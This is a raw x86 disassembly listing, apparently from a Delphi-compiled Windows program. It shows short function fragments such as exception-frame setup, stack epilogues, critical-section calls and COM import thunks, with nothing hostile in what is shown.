call sub_40f4fc
pop eax
retn
sub_40f770
call sub_40f824
retn
sub_40f8c4
jmp sub_403a98
sub_40f8cb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f912
jmp sub_403a98
sub_40f919
pop ebx
pop ecx
pop ebp
retn
sub_40f95e
jmp sub_403a98
sub_40f965
pop ebx
pop ecx
pop ebp
retn
sub_40f9aa
jmp sub_403a98
sub_40f9b1
pop ebx
pop ecx
pop ebp
retn
sub_40f9f6
jmp sub_403a98
sub_40f9fd
pop ebx
pop ecx
pop ebp
retn
sub_40fdbf
jmp sub_403a98
sub_40fdc6
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40fe60
jmp sub_403a98
sub_40fe67
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4102d5
jmp sub_4037e4
sub_410390
jmp sub_4037e4
sub_410437
jmp sub_4037e4
sub_410530
jmp sub_4037e4
sub_410609
jmp sub_4037e4
sub_4106f1
jmp sub_4037e4
sub_4108ae
jmp sub_403a98
sub_4108b5
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410917
jmp sub_403a98
sub_41091e
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410d84
jmp sub_4037e4
sub_410e73
jmp sub_403a98
sub_410e7a
mov al [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410f18
jmp sub_403a98
sub_410f1f
mov al [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4112bc
call sub_410f74
neg al
sbb eax eax
neg eax
retn
sub_41137d
jmp sub_403a98
sub_411384
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41142d
jmp sub_403a98
sub_411434
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411985
jmp sub_4037e4
sub_411a8c
jmp sub_403a98
sub_411a93
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411b9d
jmp sub_403a98
sub_411ba4
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411ff4
jmp sub_403a98
sub_411ffb
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_412105
jmp sub_403a98
sub_41210c
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_412652
jmp sub_403a98
sub_412659
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4126fd
jmp sub_403a98
sub_412704
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412726
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404810
retn
sub_41271f
jmp sub_403a98
sub_412726
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412782
jmp sub_403a98
sub_412789
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412805
jmp sub_403a98
sub_412d4b
jmp sub_403a98
sub_412d52
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412de5
jmp sub_403a98
sub_412dec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412e09
lea eax [ ebp - 0x14 ]
call sub_4047f8
retn
sub_412e02
jmp sub_403a98
sub_412e09
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412e66
jmp sub_403a98
sub_412e6d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412f0f
jmp sub_403a98
sub_412f2c
jmp sub_403a98
sub_412f33
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41348e
jmp sub_403a98
sub_413495
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413506
jmp sub_403a98
sub_41350d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413898
push eax
call sub_40f4fc
pop eax
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
sub_4138ac
push eax
call sub_40f4fc
pop eax
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
sub_413a37
jmp sub_403a98
sub_413a63
jmp sub_403a98
sub_413a6a
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413c97
jmp sub_403a98
sub_413c9e
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_413f3f
jmp sub_403a98
sub_413fcd
jmp sub_403a98
sub_4140bd
jmp sub_403a98
sub_41415f
jmp sub_403a98
sub_414215
jmp sub_403a98
sub_4142bc
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_40f824
add esp 0x10
sub_414566
jmp sub_403a98
sub_41456d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4145b0
mov ax [ eax ]
retn
sub_4146b0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40f4fc
mov [ ebx ] 0xa
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_4146c8
mov edx 0x80020004
call sub_4146b0
retn
sub_414718
mov dl 0x1
call sub_414720
retn
sub_4147cd
jmp sub_403a98
sub_4147d4
pop esi
pop ebx
pop ebp
retn
sub_4147d8
push ebp
mov ebp esp
call sub_414998
pop ebp
retn 0x4
sub_414864
push ebp
mov ebp esp
call sub_414998
pop ebp
retn 0x4
sub_414947
jmp sub_403a98
sub_41494e
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_40330c
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4036b8
sub_414970
xor eax eax
retn
sub_414974
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_414988
mov [ ecx ] 0x8
mov al 0x1
retn
sub_414990
call sub_40ec70
retn
sub_414998
call sub_40ed60
retn
sub_4149a0
call sub_40f210
retn
sub_4149a8
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_4149bc
call sub_414998
retn
sub_4149c4
push ebp
mov ebp esp
call sub_4149a0
pop ebp
retn 0x8
sub_4149dc
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_414ab8
jmp sub_403a98
sub_414b81
jmp sub_403a98
sub_414b88
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414ba5
lea eax [ ebp - 0x10 ]
call sub_404118
retn
sub_414b9e
jmp sub_403a98
sub_414ba5
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414bb0
call sub_40f264
retn
sub_414bb8
mov ecx 0xe
call sub_414254
cmp al 0x1
retn
sub_414c37
jmp sub_403a98
sub_414c3e
pop ebp
retn
sub_414ce1
jmp sub_403a98
sub_414ce8
pop ebp
retn
sub_414e11
jmp sub_403a98
sub_414e1c
sub [ rw-data ] 0x1
retn
sub_414f1a
jmp sub_403a98
sub_414f21
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_415240
push ebx
add esp 0xffffff00
mov ebx ecx
push 0xff
lea ecx [ esp + 0x4 ]
call sub_4151a8
mov eax ebx
mov edx esp
call sub_40437c
add esp 0x100
pop ebx
retn
sub_41529c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40416c
pop esi
pop ebx
retn
sub_415378
jmp sub_403a98
sub_41537f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4153d0
jmp sub_403a98
sub_4153d7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_415524
jmp sub_403a98
sub_41552b
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4155fa
jmp sub_403a98
sub_415601
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415918
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40f824
pop esi
pop ebx
retn
sub_415bc2
jmp sub_403a98
sub_415bc9
pop ebp
retn
sub_415bcc
sub [ rw-data ] 0x1
retn
CoInitialize
jmp [ __import_lookup_table_12(ole32:CoInitialize) ]
CoUninitialize
jmp [ CoUninitialize@IAT ]
CoCreateInstance
jmp [ __import_lookup_table_12(ole32:CoCreateInstance) ]
CoTaskMemAlloc
jmp [ __import_lookup_table_12(ole32:CoTaskMemAlloc) ]
sub_415c19
jmp sub_403a98
sub_415c20
pop ebp
retn
sub_415c24
sub [ rw-data ] 0x1
retn
sub_416527
add [ esp + 0x4 ] 0xfffffff8
jmp sub_4194e8
sub_416531
add [ esp + 0x4 ] 0xfffffff8
jmp sub_419508
sub_416e61
add [ esp + 0x4 ] 0xffffffec
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x8 ]
sub_41765c
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_4176d0
push ecx
mov [ esp ] eax
cmp [ esp ] 0xffff
jne r-xdata
xor eax eax
pop edx
retn
cmp [ esp + 0x2 ] 0xffff
je r-xdata
mov al 0x1
pop edx
retn
sub_41779c
mov eax [ eax + 0xc ]
call sub_418b9c
retn
sub_417a73
jmp sub_403a98
sub_417a7a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417a80
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_418d54
test eax eax
setge al
pop esi
pop ebx
retn
sub_417d83
jmp sub_403a98
sub_417d8a
mov esp ebp
pop ebp
retn
sub_417e58
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_417e64
push ebx
mov ebx edx
mov edx ebx
call sub_417c78
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_4179d8
sub_417f10
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_41806b
jmp sub_403a98
sub_41813f
jmp sub_403a98
sub_418150
mov eax [ eax - 0x38 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_4181bc
jmp sub_403a98
sub_4181c3
pop ebx
mov esp ebp
pop ebp
retn
sub_41820e
jmp sub_403a98
sub_418215
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_4182a1
jmp sub_403a98
sub_4182a8
pop ebx
pop ebp
retn
sub_418322
jmp sub_403a98
sub_418329
pop ebx
pop ebp
retn
sub_41836e
jmp sub_403a98
sub_418375
pop ebx
pop ebp
retn
sub_4183bf
jmp sub_403a98
sub_4183c6
pop esi
pop ebx
pop ebp
retn
sub_41841a
jmp sub_403a98
sub_418421
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_41854e
jmp sub_403a98
sub_4185ca
jmp sub_403a98
sub_4186a0
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_418e94
sub_418790
jmp sub_403a98
sub_41891a
jmp sub_403a98
sub_418921
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4189bb
jmp sub_403a98
sub_4189c2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4189e1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_4189da
jmp sub_403a98
sub_4189e1
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_418a4d
jmp sub_403a98
sub_418a54
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_418b4c
jmp sub_403a98
sub_418b53
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_40331c
retn
sub_418b69
jmp sub_403a98
sub_418bd0
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_418ef0
xor edx edx
mov eax ebx
call sub_418eb4
pop ebx
retn
sub_418c48
mov eax [ ebp + 0x4 ]
retn
sub_418c7e
pop ecx
pop edx
pop esi
pop ebx
retn
sub_418ccc
jmp sub_403a98
sub_418cd3
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_418cd8
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_418cf0
xor edx edx
call sub_418cf8
retn
sub_418de0
mov edx [ eax + 0x8 ]
dec edx
call sub_418cf8
retn
sub_418f60
retn
sub_41901a
jmp sub_403a98
sub_419021
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4036b8
sub_4190b0
jmp sub_403a98
sub_4190b7
pop ebx
pop ecx
pop ebp
retn
sub_4190bc
push ebx
mov ebx eax
lea eax [ ebx + 0x8 ]
push eax
call EnterCriticalSection
mov eax [ ebx + 0x4 ]
pop ebx
retn
sub_419113
jmp sub_403a98
sub_41911a
pop ebx
pop ecx
pop ebp
retn
sub_419120
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_41915c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
call sub_403ad0
retn
sub_419174
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_41924f
retn
sub_4192f4
test edx edx
je r-xdata
xor edx edx
call sub_419308
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_4193be
jmp sub_403a98
sub_4193c5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4193d8
xchg edx eax
call sub_419308
retn
sub_4193e0
retn
sub_419479
jmp sub_403a98
sub_419480
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4194d6
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
sub_41963d
jmp sub_403a98
sub_419644
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4197ad
jmp sub_403a98
sub_4197b4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4197f8
xor edx edx
call sub_4196b4
retn
sub_419966
jmp sub_403a98
sub_419980
inc [ eax + 0xc ]
retn
sub_419984
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_4199ee
jmp sub_403a98
sub_4199fc
dec [ eax + 0xc ]
call sub_419984
retn
sub_419a08
xor eax eax
retn
sub_419a0c
push ebx
mov ebx ecx
mov eax ebx
call sub_404118
pop ebx
retn
sub_419b02
jmp sub_403a98
sub_419b09
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419c19
jmp sub_403a98
sub_419d10
retn
sub_419d14
retn
sub_419d54
retn
sub_419d58
retn
sub_419dc4
mov eax [ eax + 0x18 ]
retn
sub_419e40
mov ecx [ eax ]
call [ ecx + 0x38 ]
retn
sub_419ed2
jmp sub_403a98
sub_419ed9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419ef6
lea eax [ ebp - 0xc ]
call sub_404118
retn
sub_419eef
jmp sub_403a98
sub_419ef6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419f80
jmp sub_403a98
sub_419f98
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_41a054
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_41a0fd
jmp sub_403a98
sub_41a104
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a110
mov eax [ ebp + 0x4 ]
retn
sub_41a146
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41a194
jmp sub_403a98
sub_41a19b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41a25a
jmp sub_403a98
sub_41a261
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a283
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40413c
retn
sub_41a27c
jmp sub_403a98
sub_41a283
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a28c
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_41a310
jmp sub_403a98
sub_41a317
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41a4dc
jmp sub_403a98
sub_41a4e3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a555
jmp sub_403a98
sub_41a55c
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41a66f
jmp sub_403a98
sub_41a676
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a70b
jmp sub_403a98
sub_41a712
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a790
jmp sub_403a98
sub_41a797
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a867
jmp sub_403a98
sub_41a86e
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a924
jmp sub_403a98
sub_41a92b
pop esi
pop ecx
pop ebp
retn
sub_41a9b0
jmp sub_403a98
sub_41a9b7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a9d4
lea eax [ ebp - 0x8 ]
call sub_404118
retn
sub_41a9cd
jmp sub_403a98
sub_41a9d4
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41aa60
jmp sub_403a98
sub_41aa7d
jmp sub_403a98
sub_41aa84
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41aac0
retn
sub_41ab43
jmp sub_403a98
sub_41ab4a
mov eax [ ebp - 0x8 ]
call sub_41d880
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ab6f
lea eax [ ebp - 0xc ]
call sub_404118
retn
sub_41ab68
jmp sub_403a98
sub_41ab6f
mov esp ebp
pop ebp
retn
sub_41abbf
jmp sub_403a98
sub_41abc6
pop esi
pop ecx
pop ebp
retn
sub_41ac19
jmp sub_403a98
sub_41ac20
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41ac28
retn
sub_41aca3
jmp sub_403a98
sub_41acaa
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41ad47
jmp sub_403a98
sub_41ad4e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ad6b
lea eax [ ebp - 0x8 ]
call sub_404118
retn
sub_41ad64
jmp sub_403a98
sub_41ad6b
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41ad70
retn
sub_41adea
jmp sub_403a98
sub_41adf1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41adf8
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x1
jne r-xdata
mov al [ ebx + 0x5 ]
pop ebx
retn
mov dl 0x2c
mov eax ebx
call sub_41ae28
sub_41ae10
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x2
jne r-xdata
mov al [ ebx + 0x6 ]
pop ebx
retn
mov dl 0x22
mov eax ebx
call sub_41ae44
sub_41ae60
mov eax edx
mov edx ecx
call sub_408210
retn
sub_41ae6c
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x4
jne r-xdata
mov al [ ebx + 0x7 ]
pop ebx
retn
mov dl 0x3d
mov eax ebx
call sub_41ae84
sub_41aefc
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop ebx
retn
sub_41af6c
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x22 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_41af88
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_41b17c
mov eax [ eax + 0x18 ]
retn
sub_41b180
mov eax [ eax + 0x14 ]
retn
sub_41b21c
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_41b428
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
shl edx 0x3
lea eax [ ebx + 0x10 ]
call sub_40272c
mov [ ebx + 0x18 ] esi
pop esi
pop ebx
retn
sub_41b464
test dl dl
je r-xdata
mov edx [ eax ]
call [ edx + 0x80 ]
retn
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_41b47c
push ebx
mov ebx [ eax + 0x10 ]
mov ecx [ ebx + ecx * 8 ]
mov ebx [ eax + 0x10 ]
mov edx [ ebx + edx * 8 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_41b490
mov edx sub_41b47c
mov ecx [ eax ]
call [ ecx + 0x94 ]
retn
sub_41b4d8
cmp [ eax + 0x1e ] 0x0
je r-xdata
mov eax edx
mov edx ecx
call sub_408210
retn
mov eax edx
mov edx ecx
call sub_4081d8
retn
sub_41b574
retn
sub_41b86c
jmp sub_403a98
sub_41b873
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41b8d4
jmp sub_403a98
sub_41b8db
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41b8e4
xor ecx ecx
call sub_41b8ec
retn
sub_41b93c
jmp sub_403a98
sub_41b943
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41b984
mov eax [ eax + 0x4 ]
call sub_408914
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_41b994
mov eax [ eax + 0x4 ]
call sub_408940
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_41b9d0
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_41bb79
jmp sub_403a98
sub_41bbd8
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
sub_41bc68
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_41bcb8
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
sub_41bfd3
jmp sub_403a98
sub_41bfda
mov esp ebp
pop ebp
retn
sub_41c084
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
call sub_403ad0
retn
sub_41c10c
mov [ eax + 0x18 ] edx
retn
sub_41c288
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_41514c
retn
sub_41c30f
jmp sub_403a98
sub_41c316
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41c3c2
jmp sub_403a98
sub_41c3c9
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41c56d
jmp sub_403a98
sub_41c5bf
jmp sub_403a98
sub_41c5de
jmp sub_403a98
sub_41c5e5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c604
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41c5fd
jmp sub_403a98
sub_41c604
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41c6a7
jmp sub_403a98
sub_41c72f
jmp sub_403a98
sub_41c73c
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
call sub_403ad0
pop ebx
retn
sub_41c754
mov eax [ rw-data ]
call sub_41c73c
retn
sub_41c78c
push ebx
call sub_414f80
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_41c754
sub_41c8f9
jmp sub_403a98
sub_41c900
mov eax [ ebp - 0x4 ]
add eax 0x70
call sub_404118
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_41ca20
jmp sub_403a98
sub_41ca27
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41cb1e
jmp sub_403a98
sub_41cb3b
jmp sub_403a98
sub_41cb42
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41cc40
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_41b4f4
mov edx [ ebx + 0x14 ]
sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_41cd04
push ebx
mov ebx eax
mov eax ebx
call sub_41e6b8
cmp al 0x9
sete al
pop ebx
retn
sub_41cd63
jmp sub_403a98
sub_41cd6a
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41ce10
jmp sub_403a98
sub_41ce17
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41ce30
[ eax + 0x74 ]
sub_41d096
jmp sub_4037e4
sub_41d0c2
jmp sub_4037e4
sub_41d164
jmp sub_4037e4
sub_41d207
jmp sub_4037e4
sub_41d3df
jmp sub_4037e4
sub_41d421
jmp sub_403a98
sub_41d451
jmp sub_403a98
sub_41d458
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d4c7
jmp sub_403a98
sub_41d59e
jmp sub_403a98
sub_41d5a5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d878
mov dl 0x1
call sub_41c7e0
retn
sub_41d9b0
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_41d9b9
jmp sub_403a98
j_sub_41d9b0
jmp sub_41d9b0
sub_41d9c0
pop ebx
mov esp ebp
pop ebp
retn
sub_41d9c8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_41e7c8
mov eax [ rw-data ]
call sub_41c73c
pop ebp
retn
j_sub_403910#5
jmp sub_403910
j_sub_403910#4
jmp sub_403910
sub_41dbb4
jmp sub_403a98
sub_41dbbb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41dc9b
jmp sub_403a98
sub_41dca2
mov esp ebp
pop ebp
retn
sub_41dd5a
jmp sub_403a98
sub_41dd61
pop ecx
pop ecx
pop ebp
retn
sub_41e063
jmp sub_403a98
sub_41e06a
pop ebx
mov esp ebp
pop ebp
retn
sub_41e30f
jmp sub_403a98
sub_41e316
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_40331c
retn
sub_41e32f
jmp sub_403a98
sub_41e353
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_4037e4
sub_41e38a
jmp sub_4037e4
sub_41e3c9
jmp sub_403a98
sub_41e3d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e3f2
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_40413c
retn
sub_41e3eb
jmp sub_403a98
sub_41e3f2
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e479
jmp sub_4037e4
sub_41e4a6
jmp sub_403a98
sub_41e4ad
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41e4b8
push ecx
mov edx esp
mov ecx 0x4
call sub_41cc7c
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_41c73c
sub_41e5c5
jmp sub_403a98
sub_41e5cc
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41e6ab
jmp sub_403a98
sub_41e6b2
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e708
jmp sub_403a98
sub_41e70f
pop ebx
pop ecx
pop ebp
retn
sub_41e957
jmp sub_403a98
sub_41e95e
pop ecx
pop ecx
pop ebp
retn
sub_41e9a1
jmp sub_403a98
sub_41e9a8
pop ebx
pop ecx
pop ebp
retn
sub_41ea44
jmp sub_403a98
sub_41ea4b
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41eaf9
jmp sub_403a98
sub_41eb00
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41eb0c
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_41ed67
jmp sub_403a98
sub_41ed6e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ed93
mov eax [ ebp - 0x8 ]
call sub_40331c
mov eax [ ebp - 0x4 ]
call sub_40331c
retn
sub_41ed8c
jmp sub_403a98
sub_41ed93
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
